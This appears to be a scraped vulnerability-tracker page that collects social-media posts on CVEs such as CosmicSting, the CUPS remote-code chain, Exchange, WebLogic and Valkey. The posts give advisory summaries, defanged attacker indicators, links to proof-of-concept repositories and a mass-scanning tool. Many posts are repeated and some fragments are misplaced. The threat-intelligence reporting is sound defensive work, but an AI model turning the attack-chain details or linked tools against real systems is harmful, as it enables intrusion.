On October 4, 2024, it was reported that several well-known brands, including Ray-Ban, National Geographic, Whirlpool, and Segway, experienced breaches of their web stores due to the CosmicSting vulnerability, CVE-2024-34102. This vulnerability, identified in Adobe's Commerce and Magento software, allows cybercriminals to tamper with webpage content, enabling them to siphon off sensitive user data quietly. The flaw, rated...
https://breach-hq.com/breaches/adobe-commerce/2024-oct

##
screaminggoat at 2024-10-02T14:04:53.037Z ##

Sansec: Thousands of Adobe Commerce stores hacked in competing CosmicSting campaigns
Reference: CVE-2024-34102 (9.8 critical, disclosed 11 July 2024 by Adobe as an exploited zero-day, added to KEV Catalog 17 July 2024) Adobe Commerce and Magento Open Source Improper Restriction of XML External Entity Reference (XXE) Vulnerability... aka CosmicSting

Sansec reports that 5% of all Adobe Commerce and Magento stores have been hacked since the announcement of the exploited zero-day CVE-2024-34102. Seven distinct groups are using CosmicSting attacks to plant malicious code on victim stores.

Usually, the first hacker to break into a site will secure it to keep others out. However, the CosmicSting vulnerability prevents this, leading to multiple groups fighting for control over the same store and evicting each other again and again.

Sansec lists and describes the cybercriminals:

  • Group Bobry: using whitespace encoding to hide malware in plain sight
  • Group Polyovki: using cdnstatics[.]net to embed a script
  • Group Surki: used the number 42 to encrypt its payload and operates using domain fallodick87-78[.]sbs
  • Group Burunduki: their loader uses a custom port sniffer for a websocket at wss[://]jgueurystatic[.]xyz:8101
  • Group Ondatry: builds custom malware that integrates specifically with the payment solution of that merchant.
  • Group Khomyaki: uses malware loader endppoints with two character URIs
  • Group Belki: uses CosmicSting with CNEXT for RCE, hides backdoors in files, and background processes, injects skimming malware

Indicators of compromise are all over the blog post. There are also older indicators

#threatintel #cybercrime #cosmicsting #CVE_2024_34102 #adobecommerce #magento #IOC #cyberthreatintelligence #cti #infosec #cybersecurity

##
iulianvostrut@mastodon.social at 2024-10-02T12:24:48.000Z ##

Urgent: Critical vulnerability CVE-2024-34102 impacting 5% of Adobe Commerce & Magento stores. 7 hacker groups injecting malicious scripts. Patching alone isn't enough—rotate encryption keys now! Check details at: https://t.co/FEujjbiBVU #cybersecurity

Sansec reports that 5% of all Adobe Commerce and Magento stores have been hacked since the announcement of the exploited zero-day CVE-2024-34102. Seven distinct groups are using CosmicSting attacks to plant malicious code on victim stores.

Sansec lists and describes the cybercriminals:

  • Group Bobry: using whitespace encoding to hide malware in plain sight
  • Group Polyovki: using cdnstatics[.]net to embed a script
  • Group Surki: used the number 42 to encrypt its payload and operates using domain fallodick87-78[.]sbs

##

CVE-2023-36039
(8.0 HIGH)

EPSS: 0.06%

updated 2024-05-29T02:15:59.963000

1 posts

Microsoft Exchange Server Spoofing Vulnerability

screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##

CVE-2023-36035
(8.0 HIGH)

EPSS: 0.06%

updated 2024-05-29T02:15:59.473000

1 posts

Microsoft Exchange Server Spoofing Vulnerability

1 repos

#search_error

screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

##

CVE-2023-36756
(8.0 HIGH)

EPSS: 0.08%

updated 2024-04-04T07:37:27

1 posts

Microsoft Exchange Server Remote Code Execution Vulnerability

1 repos

#search_error

screaminggoat@infosec.exchange at 2024-09-26T21:31:11.000Z ##

Zero Day Initiative: Exploiting Exchange PowerShell After ProxyNotShell: Part 4 – No Argument Constructor
This is the 4th and final part in a series of 4 blog posts. (See parent toots above)
Piotr Bazydło @chudypb describes the PowerShell Remoting ConvertViaNoArgumentConstructor conversion mechanism, which allowed him to find 3 more vulnerabilities:

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))
  • CVE-2023-36039 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)
  • CVE-2023-36035 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as NTLM Relaying)

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

Note that CVE-2023-36035 is a partial bypass of CVE-2023-36756 (8.0, disclosed 12 September 2023) Microsoft Exchange Server Remote Code Execution Vulnerability.

#ProxyNotShell #vulnerabilityanalysis #cve #microsoft #exchange

#cisa #kev #vulnerability #cve #eitw #activeexploitation #CVE_2019_0344 #CVE_2021_4043 #CVE_2020_15415 #CVE_2023_25280 #draytek #dlink #motionspell #sap

##

CVE-2024-1580
(5.9 MEDIUM)

EPSS: 0.05%

updated 2024-03-27T18:32:38

2 posts

An integer overflow in dav1d AV1 decoder that can occur when decoding videos with large frame size. This can lead to memory corruption within the AV1 decoder. We recommend upgrading past version 1.4.0 of dav1d.

screaminggoat at 2024-10-04T14:43:49.993Z ##

Google Project Zero: Effective Fuzzing: A Dav1d Case Study
Google Project Zero publishes vulnerability details (and a proof of concept) about CVE-2024-1580 (5.9 medium, disclosed 14 February 2024 by dav1d) integer overflow in dav1d AV1 video decoder. The short explanation is that when multiple decoding threads are used, a signed 32-bit integer overflow can occur when calculating the values to put in the tile start offset array. Dav1d is already being fuzzed by at least oss-fuzz, but it has its limitations: "It's good that the fuzzer will create one or four threads, depending on the fuzzer configuration, but if vulnerabilities exist only when there are three threads, or 19 threads, these will not be detected by any use of this fuzzer."

Another example of untested coverage in the dav1d fuzzer, and the most interesting one for me because it led to the discovery of the integer overflow vulnerability, is the usage of DAV1D_FUZZ_MAX_SIZE.
This maximum frame size did not exist in all configurations used by dav1d users, and although 32-bit platforms have an internally applied limit, there is no limit by default for 64-bit platforms. Removing this line (and using the multithreaded fuzzer with ubsan enabled) was enough to trigger the integer overflow.

#CVE_2024_1580 #vulnerability #CVE #dav1d #infosec #cybersecurity

##
screaminggoat@infosec.exchange at 2024-10-04T14:43:49.000Z ##

Google Project Zero: Effective Fuzzing: A Dav1d Case Study
Google Project Zero publishes vulnerability details (and a proof of concept) about CVE-2024-1580 (5.9 medium, disclosed 14 February 2024 by dav1d) integer overflow in dav1d AV1 video decoder. The short explanation is that when multiple decoding threads are used, a signed 32-bit integer overflow can occur when calculating the values to put in the tile start offset array. Dav1d is already being fuzzed by at least oss-fuzz, but it has its limitations: "It's good that the fuzzer will create one or four threads, depending on the fuzzer configuration, but if vulnerabilities exist only when there are three threads, or 19 threads, these will not be detected by any use of this fuzzer."

Another example of untested coverage in the dav1d fuzzer, and the most interesting one for me because it led to the discovery of the integer overflow vulnerability, is the usage of DAV1D_FUZZ_MAX_SIZE.
This maximum frame size did not exist in all configurations used by dav1d users, and although 32-bit platforms have an internally applied limit, there is no limit by default for 64-bit platforms. Removing this line (and using the multithreaded fuzzer with ubsan enabled) was enough to trigger the integer overflow.

#CVE_2024_1580 #vulnerability #CVE #dav1d #infosec #cybersecurity

1 repos

https://github.com/paulsery/CVE_2023_3420

hweimer@fediscience.org at 2024-09-30T10:17:33.000Z ##

@kuketzblog Praktisch alle Browser-Bugs für remote code execution betreffen Javascript-Code (z.B. CVE-2023-37450, CVE-2023-3420, CVE-2024-3833). Selten ist wie in CVE-2023-4863 sowas wie eine Bildbibliothek betroffen.

Wenn du eine typische Webseite gehst (z.B. Zeit), dann werden da 10-20 Javascript-Elemente von externen Unternehmen nachgeladen, und das ist nur die erste Ebene. Das erhöht massiv die Angriffsoberfläche und Chrome unter Android bietet keine Möglichkeit, sich dagegen zu wehren.

This is the 4th and final part in a series of 4 blog posts. (See parent toots above)

  • CVE-2023-36050 (8.0 high, disclosed 14 November 2023 by Microsoft Microsoft Exchange Server Spoofing Vulnerability (described as an XXE (File Read))

The deserialization routine for ConvertViaNoArgumentConstructor opens up two main exploitation vectors: dangerous members of allowed types, and dangerous setters of allowed types.

For RocketMQ versions 5.1.0 and below, under certain conditions, there is a risk of remote command execution.  Several components of RocketMQ, including NameServer, Broker, and Controller, are leaked on the extranet and lack permission verification, an attacker can exploit this vulnerability by using the update configuration function to execute commands as the system users that RocketMQ is runnin

##
PC_Fluesterer@social.tchncs.de at 2024-10-04T13:51:50.000Z ##

@sihaha
My first question is always: How is the initial entry accomplished, where does the attack vector start? Answers here:
- misconfigurations or
- exploit vulnerability in Apache RocketMQ (CVE-2023-33246).

Both are administration faults. The latter because updates were available immediately. Failure to install those is an administrator's fault.

##

##

CVE-2021-25735
(6.5 MEDIUM)

EPSS: 0.07%

updated 2023-06-26T19:16:31.153000

2 posts

A security issue was discovered in kube-apiserver that could allow node updates to bypass a Validating Admission Webhook. Clusters are only affected by this vulnerability if they run a Validating Admission Webhook for Nodes that denies admission based at least partially on the old state of the Node object. Validating Admission Webhook does not observe some previous fields.

1 repos

https://github.com/darryk10/CVE-2021-25735

kubesploit@learnk8s.news at 2024-10-04T18:16:06.000Z ##

This article discusses the validating admission webhook bypass vulnerability, which allows node updates to bypass a validating admission webhook

You will learn how to detect this type of event by enabling Kubernetes Audit Logging in the cluster

➜ https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass

##
kubesploit@learnk8s.news at 2024-10-04T18:16:06.000Z ##

This article discusses the validating admission webhook bypass vulnerability, which allows node updates to bypass a validating admission webhook

You will learn how to detect this type of event by enabling Kubernetes Audit Logging in the cluster

➜ https://sysdig.com/blog/cve-2021-25735-kubernetes-admission-bypass

CVE-2020-14883
(7.2 HIGH)

EPSS: 97.38%

updated 2023-01-27T05:02:32

2 posts

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows high privileged attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeove

Nuclei template

screaminggoat at 2024-09-30T13:44:03.611Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

#8220gang #cybercrime #cryptomining #CVE_2017_10271 #CVE_2020_14883 #vulnerability #eitw #oracle #weblogic #threatintel #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC

##
screaminggoat@infosec.exchange at 2024-09-30T13:44:03.000Z ##

Sekoia: Hadooken and K4Spreader: The 8220 Gang's Latest Arsenal
Sekoia was able to capture the full attack chain of the Chinese origin cybercriminal 8220 Gang, from targeting CVE-2017-10271 and CVE-2020-14883 in Oracle Weblogic servers to deploy Python and Bash scripts, execute K4Spreader malware, which then delivered the Tsunami backdoor and a cryptominer. There are similarities with Aqua's blog post about Hadooken malware from 12 September 2024. Sekoia covers these different infection chains, the connections with the 8220 Gang, and the cross-references with the Hadooken case previously documented by Aqua. Indicators of compromise are listed on their GitHub repo.

References:

  • CVE-2017-10271 (7.5 high, disclosed 19 October 2017, in KEV) Oracle Corporation WebLogic Server Remote Code Execution Vulnerability
  • CVE-2020-14883 (7.2 high, disclosed 21 October 2020, in KEV) Oracle WebLogic Server Unspecified Vulnerability

Apple security advisory: About the security content of Apple TV 1.5.0.152 for Windows
Apple belatedly publishes the advisory for Apple TV which was supposed to be released Thursday. CVE-2024-44157 is a stack buffer overflow that could allow for unexpected system termination if Video Playback parses a malicious crafted video file. No mention of exploitation. h/t: @applsec

CVE-2024-31228

EPSS: 0.04%

linux_mclinuxface@fosstodon.org at 2024-10-02T22:20:48.000Z ##

#Valkey 8.0.1 and 7.2.7 are out and fix:

- CVE-2024-31449 Lua library commands may lead to stack overflow and potential RCE.
- CVE-2024-31227 Potential Denial-of-service due to malformed ACL selectors.
- CVE-2024-31228 Potential Denial-of-service due to unbounded pattern matching.

(FYI these are also present in Redis which released their patched versions 3 hour ago)

##

CVE-2024-31449: https://codeberg.org/redict/redict/commit/c09bc5df7977aef8dba59d6c44e971fe711a71a0 (the most interesting one)
CVE-2024-31228: https://codeberg.org/redict/redict/commit/a8edd3f6ac286884d15c7228f1a33f8a950f5288
CVE-2024-31227: https://codeberg.org/redict/redict/commit/e035e7b763265abb32957a4c3298defbde75fcd4

https://fosstodon.org/@drewdevault/113232068146239051

##

CVE-2024-31227
(0 None)

EPSS: 0.04%

4 posts

N/A

linux_mclinuxface@fosstodon.org at 2024-10-02T22:20:48.000Z ##

#Valkey 8.0.1 and 7.2.7 are out and fix:

- CVE-2024-31449 Lua library commands may lead to stack overflow and potential RCE.
- CVE-2024-31227 Potential Denial-of-service due to malformed ACL selectors.
- CVE-2024-31228 Potential Denial-of-service due to unbounded pattern matching.

(FYI these are also present in Redis which released their patched versions 3 hour ago)

CVE-2024-9370
(0 None)

EPSS: 0.00%

2 posts

N/A

screaminggoat at 2024-10-02T16:30:05.160Z ##

Google Chrome security advisory: Stable Channel Update for Desktop
New version 129.0.6668.89/.90 for Windows, Mac and 129.0.6668.89 for Linux includes 4 security fixes, 3 externally reported:

  • CVE-2024-7025 (high) Integer overflow in Layout
  • CVE-2024-9369 (high) Insufficient data validation in Mojo
  • CVE-2024-9370 (high) Inappropriate implementation in V8

No mention of exploitation.

#google #chrome #vulnerability #cve

##
screaminggoat@infosec.exchange at 2024-10-02T16:30:05.000Z ##

https://ubuntu.com/security/notices/USN-7043-2
https://ubuntu.com/security/notices/USN-7043-1

https://security-tracker.debian.org/tracker/CVE-2024-47076
https://security-tracker.debian.org/tracker/CVE-2024-47176
https://packages.debian.org/source/bullseye/cups-filters
https://security-tracker.debian.org/tracker/source-package/cups-filters

http://www.slackware.com/security/viewer.php?l=slackware-security&y=2024&m=slackware-security.390689

##
lkarlslund at 2024-09-30T08:09:30.158Z ##

Use my new tool 'jugular' to do ultrafast scans of your internal networks (or the entire Internet?) for open (likely vulnerable) CUPS-browsed instances.

Many will be affected by the multiple CUPS vulnerabilities we learned about last week (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177) and this should help you map out what you have in your infrastructure.

It's for Linux only, as it's written for performance (direct UDP packet creation and sending). There's a compiled x64 Linux binary available, otherwise you can build it yourself.

The debacle about the entire CUPS thing is a mess. Of course getting root by installing a malicious printer is bad, but it does require the target to actually print something. I think the potential for weaponizing the parsing problems is worse though.

Let me know what you think, comments and input is welcome.

https://github.com/lkarlslund/jugular

##
patchnow24x7 at 2024-09-28T07:45:51.763Z ##

ATTENTION LINUX USERS!!

Multiple Critical vulnerabilities in CUPS (Common Unix Printing System) chained for Remote Code Execution.
POC is available publicly!

Advisories:
https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8

https://github.com/OpenPrinting/libcupsfilters/security/advisories/GHSA-w63j-6g73-wmg5

https://github.com/OpenPrinting/libppd/security/advisories/GHSA-7xfx-47qg-grp6

https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47

POC:
https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/

https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8

https://github.com/RickdeJager/cupshax/tree/main

Fixes:
CVE-2024-47175 : https://github.com/OpenPrinting/libppd/commit/d681747ebf

CVE-2024-47076 : https://github.com/OpenPrinting/libcupsfilters/commit/95576ec3

CVE-2024-47176 : https://github.com/OpenPrinting/cups-browsed/commit/1debe6b140c(temporary workaround)

Vendor Advisories:

RedHat: https://www.redhat.com/en/blog/red-hat-response-openprinting-cups-vulnerabilities

PaloAlto: https://security.paloaltonetworks.com/CVE-2024-47076

Canonical: https://ubuntu.com/blog/cups-remote-code-execution-vulnerability-fix-available

##
freexian@hachyderm.io at 2024-09-27T15:28:45.000Z ##

As concluded by the Debian Security Team –and we concur– the first updates to address the vulnerabilities will be done in unstable to evaluate if any regression is likely. Once we are confident with the fixes, we will upload to the other releases.

The four related CVEs can be tracked with the following links:

https://security-tracker.debian.org/tracker/CVE-2024-47076
https://security-tracker.debian.org/tracker/CVE-2024-47175
https://security-tracker.debian.org/tracker/CVE-2024-47176
https://security-tracker.debian.org/tracker/CVE-2024-47177

##
screaminggoat at 2024-09-27T14:55:12.990Z ##

Sonicwall security advisory: Common UNIX Printing System (CUPS) Vulnerabilities

The SonicWall PSIRT has analyzed CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) to assess their relevance to our products and services.
SonicWall products and cloud services do not incorporate the impacted CUPS software packages and are not affected by these vulnerabilities.

SonicWall PSIRT is aware that a proof of concept (PoC) exploit for this vulnerabilities is publicly available, we have no information regarding any exploitation of this vulnerability in the wild.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve #proofofconcept

##
adulau at 2024-09-27T04:17:33.792Z ##

All versions of Red Hat Enterprise Linux (RHEL) are affected by CVE-2024-47076, CVE-2024-47175, CVE-2024-47176 and CVE-2024-47177, but are not vulnerable in their default configurations.
https://vulnerability.circl.lu/bundle/3eaf0fde-67ad-4326-a84a-2e4ff201a8e9

screaminggoat@infosec.exchange at 2024-09-27T14:55:12.000Z ##

Sonicwall security advisory: Common UNIX Printing System (CUPS) Vulnerabilities

The SonicWall PSIRT has analyzed CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) to assess their relevance to our products and services.
SonicWall products and cloud services do not incorporate the impacted CUPS software packages and are not affected by these vulnerabilities.

SonicWall PSIRT is aware that a proof of concept (PoC) exploit for this vulnerabilities is publicly available, we have no information regarding any exploitation of this vulnerability in the wild.

##
screaminggoat@infosec.exchange at 2024-09-27T00:12:21.000Z ##

Tenable: CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177: Frequently Asked Questions About Common UNIX Printing System (CUPS) Vulnerabilities
This is perhaps the most informative and comprehensive guide to the CUPS vulnerabilities yet. While I question the use of the phrase zero-days, they were publicly announced prematurely due to a leak ahead of a coordinated disclosure date, and proof of concept has been released. Fortunately, it's not the 9.9 doomsday that everyone was hawk tuahing about. Skibidi I don't think anyone reads what I write anyway. Only in Ohio though.

As @CraigHRowland said:

The bad news is there is a vulnerability in the CUPS printer system on Linux. The good news is nobody has ever gotten their printer working on Linux so they are safe.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #vulnerability #cve

##
jwildeboer@social.wildeboer.net at 2024-09-26T22:10:22.000Z ##

@GossiTheDog @dangoodin The currently assigned CVE's have these CVSS scores (which are NOT the 9.9 score claimed by the person who found the vulnerability):

https://access.redhat.com/security/cve/CVE-2024-47177 Score: 6.1
https://access.redhat.com/security/cve/CVE-2024-47176 Score 7.5
https://access.redhat.com/security/cve/CVE-2024-47175 Score 7.7
https://access.redhat.com/security/cve/CVE-2024-47076 Score 8.2

Overall rating at Red Hat is "important". Immediate workaround is available. Fixes are coming.

##
screaminggoat@infosec.exchange at 2024-09-26T21:06:29.000Z ##

Palo Alto Networks advisory: CVE-2024-47076 Informational: No Impact of CUPS Vulnerabilities on Palo Alto Networks Products
The Palo Alto Networks Product Security Assurance team has evaluated CVE-2024-47076, CVE-2024-47177, CVE-2024-47175, and CVE-2024-47176 in the Common UNIX Printing System (CUPS) as they relate to our products. Based on current information, Palo Alto Networks products and cloud services do not contain affected CUPS-related software packages and are not impacted by these issues.

Note: PAN on top of the social media scene or have people giving them a heads up.

#CVE_2024_47076 #CVE_2024_47177 #CVE_2024_47175 #CVE_2024_47176 #CUPS #linux #PaloAltoNetworks #vulnerability #cve

##
screaminggoat@infosec.exchange at 2024-09-26T20:01:05.000Z ##

Evil Socket: Attacking UNIX Systems via CUPS, Part I

  • CVE-2024-47176 cups-browsed <= 2.0.1 binds on UDP INADDR_ANY:631 trusting any packet from any source to trigger a Get-Printer-Attributes IPP request to an attacker controlled URL.
  • CVE-2024-47076 libcupsfilters <= 2.1b1 cfGetPrinterAttributes5 does not validate or sanitize the IPP attributes returned from an IPP server, providing attacker controlled data to the rest of the CUPS system.
  • CVE-2024-47175 libppd <= 2.1b1 ppdCreatePPDFromIPP2 does not validate or sanitize the IPP attributes when writing them to a temporary PPD file, allowing the injection of attacker controlled data in the resulting PPD.
  • CVE-2024-47177 cups-filters <= 2.0.1 foomatic-rip allows arbitrary command execution via the FoomaticRIPCommandLine PPD parameter.

cc: @chillybot @Viss @evilsocket @morb @cR0w @Enigma
